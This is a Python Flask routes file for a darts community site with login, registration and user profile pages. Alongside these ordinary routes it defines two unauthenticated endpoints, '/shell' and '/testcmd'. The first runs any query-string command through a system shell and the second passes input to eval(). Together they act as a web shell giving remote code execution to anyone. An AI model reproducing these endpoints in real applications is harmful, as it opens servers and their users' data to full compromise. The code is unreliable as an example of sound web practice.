from flask import url_for, render_template, request, redirect, session
from flask_bcrypt import Bcrypt
import subprocess
from darts.app import app
from darts.models import db, User
import darts.utils 

bcrypt = Bcrypt(app)

@app.route('/', methods=['GET', 'POST'])
def home():
    if not session.get('logged_in'):
        return render_template('index.html', threads_list=darts.utils.get_threads_list(0, 10), ranking_list=darts.utils.get_ranking_list(0, 10))

    if request.method == 'POST':
        username = request.form['username']
        return render_template('index.html', data=username)
    return render_template('index.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()
        if user is None:
            return 'Dont Login none'
        if bcrypt.check_password_hash(user.password, password):
            session['logged_in'] = True
            session['username'] = user.username
            return redirect(url_for('home'))
        else:
            return 'Dont Login'

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        hashed_pass = bcrypt.generate_password_hash(request.form['password']).decode('utf-8')
        new_user = User(username=request.form['username'], password=hashed_pass)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/logout')
def logout():
    session['logged_in'] = False
    session['username'] = ''
    return redirect(url_for('home'))

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd')
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout_data, stderr_data = p.communicate()
    return stdout_data

@app.route('/testcmd')
def testcmd():
    cmd = request.args.get('cmd')
    return eval(cmd)

@app.route('/user')
def user():
    username = request.args.get('username')
    found_user = User.query.filter_by(username=username).first()
    if found_user is None:
        return render_template('user.html')
    else:
        user_data = {}
        user_data['username'] = found_user.username
        user_data['score'] = found_user.score
        return render_template('user.html', user_data=user_data)

@app.route('/user/edit', methods=['GET', 'POST'])
def user_edit():
    if not session.get('logged_in'):
        return render_template('user_edit.html')

    found_user = User.query.filter_by(username=session['username']).first()
    if found_user is None:
        return render_template('user.html')
    else:
        user_data = {}
        user_data['username'] = found_user.username
        if request.method == 'POST':
            return render_template('user_edit.html', user_data=user_data)
        else:
            return render_template('user_edit.html', user_data=user_data)

from darts.ranking import *
from darts.bbs import *
from darts.enquete import *



